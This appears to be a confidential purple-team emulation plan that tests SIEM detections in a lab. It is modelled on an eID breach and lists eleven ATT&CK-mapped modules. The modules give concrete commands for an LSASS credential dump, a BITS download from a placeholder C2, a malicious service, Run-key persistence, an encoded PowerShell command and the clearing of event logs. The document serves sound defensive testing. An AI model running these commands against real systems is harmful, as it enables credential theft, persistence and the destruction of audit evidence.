# Emulation Plan — PROJ-2026-008 (NDSA Annual Detection Validation)

**Classification:** CONFIDENTIAL  
**Date:** 2026-01-05  
**Execution sequence:** MOD-01 → MOD-02 → MOD-03 → MOD-04 → MOD-05 → MOD-06 → MOD-07 → MOD-08 → MOD-09 → MOD-10 → MOD-11  
**Source TTPs:** March 2025 NDSA eID breach (A05); GovID 2.0 pre-launch assessment (A06)  
**Lab environment:** JUMPHOST-CONTRACTOR-LAB; VRID-LAB-SRV; NDSA-CONTRACTOR-VPN-TEST; GovID 2.0 Lab Cluster

---

## MOD-01: Contractor VPN Logon from Non-Corporate ASN (Off-Hours)

| Field | Value |
|---|---|
| ATT&CK | T1133 (adapted — simulates post-AiTM contractor impersonation) |
| Detection under test | GOV-DET-001 (VPN ASN anomaly + off-hours rule) |
| Execution account | test_contractor_01 (lab replica of a.halevi) |
| Target | NDSA-CONTRACTOR-VPN-TEST (isolated test gateway) |
| Command | Authenticate to test VPN gateway from CyberShield-hosted VPS in Turkish residential ASN; timestamp: 01:44 IST (mirrors A05 timeline event 4) |
| Pass criterion | Alert fires within 5 min; captures: user, source_ip, source_asn, timestamp, ASN classification (residential/non-corporate) |
| Failure definition | Alert does not fire = rule not deployed or ASN enrichment broken |
| Source incident | A05 timeline event 4 — 203.0.113.115 (Turkish residential VPN) |

---

## MOD-02: Domain Discovery Commands

| Field | Value |
|---|---|
| ATT&CK | T1087.002 + T1016 + T1018 |
| Detection under test | GOV-DET-NEW (net.exe domain enumeration — draft rule, not yet deployed) |
| Execution account | test_contractor_01 |
| Target | JUMPHOST-CONTRACTOR-LAB |
| Commands | `net user /domain` → `net group "NDSA-VRID-Admins" /domain` → `ipconfig /all` → `nslookup vrid-lab-srv` |
| Pass criterion | *Intentionally testing for gap* — no rule deployed; document gap confirmed |
| Note | Expected result is FAIL (gap). If rule has been deployed since TTP extraction, re-evaluate. |
| Source incident | A05 timeline events 5–7 — 8-minute reconnaissance phase before lateral movement |

---

## MOD-03: RDP Lateral Movement (JUMPHOST-CONTRACTOR-LAB → VRID-LAB-SRV)

| Field | Value |
|---|---|
| ATT&CK | T1021.001 |
| Detection under test | GOV-DET-002 (RDP cross-segment lateral movement) |
| Execution account | test_contractor_01 (with lab RDP privileges) |
| Source → Target | JUMPHOST-CONTRACTOR-LAB → VRID-LAB-SRV |
| Command | `mstsc /v:vrid-lab-srv.lab` from JUMPHOST-CONTRACTOR-LAB |
| Pass criterion | Alert fires within 35 min; fields captured: src_host (JUMPHOST-CONTRACTOR-LAB), dst_host (VRID-LAB-SRV), user (test_contractor_01), logon_type (10 = RDP) |
| PARTIAL criterion | Alert fires but logon_type field absent (known Elastic ingest pipeline field mapping issue) |
| Source incident | A05 timeline event 8 — EID 4624 Type 10 from JUMPHOST-CONTRACTOR-01 to VRID-SRV-01 |

---

## MOD-04: LSASS Memory Access via comsvcs.dll MiniDump

| Field | Value |
|---|---|
| ATT&CK | T1003.001 |
| Detection under test | GOV-DET-010 (LSASS comsvcs.dll credential dump) |
| Execution account | SYSTEM (via lab scheduled task) |
| Target | VRID-LAB-SRV |
| Command | `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [LSASS_PID] C:\Windows\Temp\test.dmp full` |
| Pass criterion | Alert fires within 5 min; GrantedAccess 0x1410 captured; process ancestry captured; dmp file present in temp path |
| FP test | Run backup tool LSASS read separately; confirm GrantedAccess filter correctly suppresses it |
| Post-module action | Delete `C:\Windows\Temp\test.dmp` immediately after result captured |
| Source incident | A05 timeline event 9 — GrantedAccess 0x1410; comsvcs.dll as dump mechanism |

---

## MOD-05: BITS Job Download from External Lab C2

| Field | Value |
|---|---|
| ATT&CK | T1197 |
| Detection under test | GOV-DET-003 (BITS job to external domain) |
| Execution account | test_contractor_01 (elevated in lab) |
| Target | VRID-LAB-SRV → CyberShield Lab C2 |
| Command | `bitsadmin /transfer svchosts_test /download /priority normal "https://[lab-c2]/test.bin" "C:\Windows\Temp\test.bin"` |
| Pass criterion | Alert fires within 10 min; job name captured; destination domain (lab-c2) flagged; source host populated |
| PARTIAL criterion | Alert fires but src_host field not populated (Winlogbeat agent.hostname vs host.name mapping) |
| Gap check | Run same command on second lab host without rule to confirm scope gap |
| Source incident | A05 timeline event 11 — BITS download of `svchosts.exe` from `govservice-cdn-updates[.]net` |

---

## MOD-06: Malicious Service Installation from Non-Standard Path

| Field | Value |
|---|---|
| ATT&CK | T1543.003 |
| Detection under test | GOV-DET-006 (service installation from Temp/non-standard path) |
| Execution account | SYSTEM |
| Target | VRID-LAB-SRV |
| Commands | `sc create SvcHostMonitor binpath= "C:\Windows\Temp\svchost.exe"` then `sc start SvcHostMonitor` |
| Pass criterion | Alert fires within 5 min; EID 7045 captured; service path `C:\Windows\Temp\` flagged as non-standard |
| Post-module action | `sc stop SvcHostMonitor` → `sc delete SvcHostMonitor` at module end |
| Source incident | A05 timeline event 14 — SvcHostMonitor service from `C:\Windows\Temp\svchost.exe` |

---

## MOD-07: HKCU Registry Run Key Persistence

| Field | Value |
|---|---|
| ATT&CK | T1547.001 |
| Detection under test | GOV-DET-007 (HKCU registry Run key — draft, requires Sysmon config update) |
| Execution account | test_contractor_01 (no admin rights needed — user-level key) |
| Target | VRID-LAB-SRV |
| Command | `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsMonitor" /t REG_SZ /d "C:\Windows\Temp\svchost.exe"` |
| Pass criterion | Alert fires within 5 min; Sysmon EID 13 captures HKCU registry write; key name and value path captured |
| Expected result | FAIL if Sysmon config has not been updated; this is a known architectural gap (Sysmon covers HKLM by default) |
| Post-module action | `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsMonitor" /f` |
| Source incident | A05 analysis — HKCU Run key in AMSI logs; Sysmon HKCU gap identified as P1 in pre-exercise backlog |

---

## MOD-08: Full-Table Database Query on Citizen Records (Collection)

| Field | Value |
|---|---|
| ATT&CK | T1005 |
| Detection under test | GOV-DET-005 (VRID full-table query detection) |
| Execution account | lab_svc_vrid (lab equivalent of SVC-HAVAYAIT-MAINT) |
| Target | VRID-LAB-SRV (test database with synthetic citizen data — no real PII) |
| Command | `vrid_query.exe SELECT * FROM citizen_records` (lab tool against test database) |
| Pass criterion | Alert fires within 5 min; query text captured; executing account logged; table name captured |
| Data safety | Pre-verified synthetic data only; no real citizen records in lab environment |
| Source incident | A05 timeline event 13 — `vrid_query.exe` full-table SELECT on `citizen_records` |

---

## MOD-09: Large-Volume HTTPS Exfiltration (413 MB Simulation)

| Field | Value |
|---|---|
| ATT&CK | T1041 |
| Detection under test | Volume threshold rule (not deployed; testing for gap) |
| Execution account | test_contractor_01 |
| Target | VRID-LAB-SRV → CyberShield Lab C2 server |
| Action | HTTPS transfer of 100 MB test file in 8 chunks to lab C2 (mirrors A05 incident: 413 MB in 8 chunks) |
| Pass criterion | Volume threshold alert fires; total bytes to non-approved destination captured; source host identified |
| Expected result | FAIL if no NetFlow or volume rule deployed — confirms P1 gap |
| Gap documentation | If no alert fires: document bytes transferred, duration, destination, chunk count; submit as P1 gap |
| Source incident | A05 timeline event 15 — 413 MB HTTPS exfiltration to 203.0.113.201:443 in 8 chunks over 78 min |

---

## MOD-10: PowerShell Encoded Command Execution

| Field | Value |
|---|---|
| ATT&CK | T1059.001 |
| Detection under test | GOV-DET-PS (PowerShell encoded command detection) |
| Execution account | test_contractor_01 |
| Target | JUMPHOST-CONTRACTOR-LAB |
| Command | `powershell.exe -EncodedCommand [base64 of "Write-Host 'emulation test 2026'"]` |
| Pass criterion | Alert fires within 5 min; `-EncodedCommand` flag captured; base64 string captured; decoded command visible in alert |
| Note | Run before MOD-11 to ensure PowerShell activity is logged before Security log is cleared |
| Source incident | Corroborated PowerShell usage during A05 incident; aligns with A06 threat model (SCN-003) |

---

## MOD-11: Security Log Clearing via wevtutil (RUN LAST)

| Field | Value |
|---|---|
| ATT&CK | T1070.001 |
| Detection under test | GOV-DET-004 (wevtutil log clear) |
| Execution account | SYSTEM |
| Target | VRID-LAB-SRV (lab only — production logs on separate systems) |
| Commands | `wevtutil cl Security` → `wevtutil cl System` → `wevtutil cl Application` |
| Pass criterion | Alert fires within 2 min; EID 1102 captured for each log cleared; host identified |
| **CRITICAL** | **Run this module LAST — it destroys all lab event log evidence from prior modules** |
| Pre-module action | Confirm all prior module results are captured in VECTR before executing |
| Source incident | A05 timeline event 16 — log clearing as final defense evasion step |

---

## Execution Order Summary

| Sequence | Module | Technique | Detection | Expected |
|---|---|---|---|---|
| 1 | MOD-01 | T1133 VPN off-hours | GOV-DET-001 | PASS |
| 2 | MOD-02 | T1087.002 Discovery | None (gap test) | FAIL |
| 3 | MOD-03 | T1021.001 RDP | GOV-DET-002 | PARTIAL (field gap) |
| 4 | MOD-04 | T1003.001 LSASS | GOV-DET-010 | PASS |
| 5 | MOD-05 | T1197 BITS | GOV-DET-003 | PARTIAL (field gap) |
| 6 | MOD-06 | T1543.003 Service | GOV-DET-006 | PASS |
| 7 | MOD-07 | T1547.001 HKCU Reg | GOV-DET-007 (draft) | FAIL (Sysmon arch gap) |
| 8 | MOD-08 | T1005 DB query | GOV-DET-005 | PASS |
| 9 | MOD-09 | T1041 Exfil volume | None (gap test) | FAIL |
| 10 | MOD-10 | T1059.001 PowerShell | GOV-DET-PS | PASS |
| 11 | MOD-11 | T1070.001 Log clear | GOV-DET-004 | PASS (LAST) |
